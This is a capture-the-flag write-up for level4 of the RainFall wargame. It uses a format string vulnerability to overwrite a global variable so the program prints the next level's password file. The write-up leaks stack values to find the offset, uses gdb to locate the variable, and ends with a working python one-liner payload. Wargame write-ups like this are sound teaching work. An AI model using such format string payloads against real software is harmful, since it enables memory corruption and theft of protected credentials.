[See detailed writeup here 3](../../level3/resources/level3.md)

We proceeded in the same way as the previous level3.
We noticed a few small differences here.
```
    if (m == 0x1025544) {
        system("/bin/cat /home/user/level5/.pass");
    }
```

Since our m value is a large number like **16930116**, the same method we did in level3 did not work directly. Because it is not possible to write such a large value with %c, instead we used a better option like %d.

When it comes to finding offsets

```
level4@RainFall:~$ echo "AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p" | ./level4
AAAA 0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil) 0xbffff748 0x804848d 0xbffff540 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
```

We have seen that the offset is at 12.

so we will perform the attack as follows;

```diff
+level4@RainFall:~$ gdb ./level4
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level4/level4...(no debugging symbols found)...done.
+(gdb) b main
Breakpoint 1 at 0x80484aa
+(gdb) r
Starting program: /home/user/level4/level4

Breakpoint 1, 0x080484aa in main ()
+(gdb) whatis m
type = <data variable, no debug info>
+(gdb) info variable
All defined variables:

Non-debugging symbols:
0x08048588  _fp_hw
0x0804858c  _IO_stdin_used
0x080486f8  __FRAME_END__
0x080496fc  __CTOR_LIST__
0x080496fc  __init_array_end
0x080496fc  __init_array_start
0x08049700  __CTOR_END__
0x08049704  __DTOR_LIST__
0x08049708  __DTOR_END__
0x0804970c  __JCR_END__
0x0804970c  __JCR_LIST__
0x08049710  _DYNAMIC
0x080497dc  _GLOBAL_OFFSET_TABLE_
0x080497fc  __data_start
0x080497fc  data_start
0x08049800  __dso_handle
0x08049804  stdin@@GLIBC_2.0
0x08049808  completed.6159
---Type <return> to continue, or q <return> to quit---
0x0804980c  dtor_idx.6161
+0x08049810  m 
```

```
address of m = 0x08049810
little indian = "\x10\x98\x04\x08"
```

```
(python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"'; cat) | ./level4
```
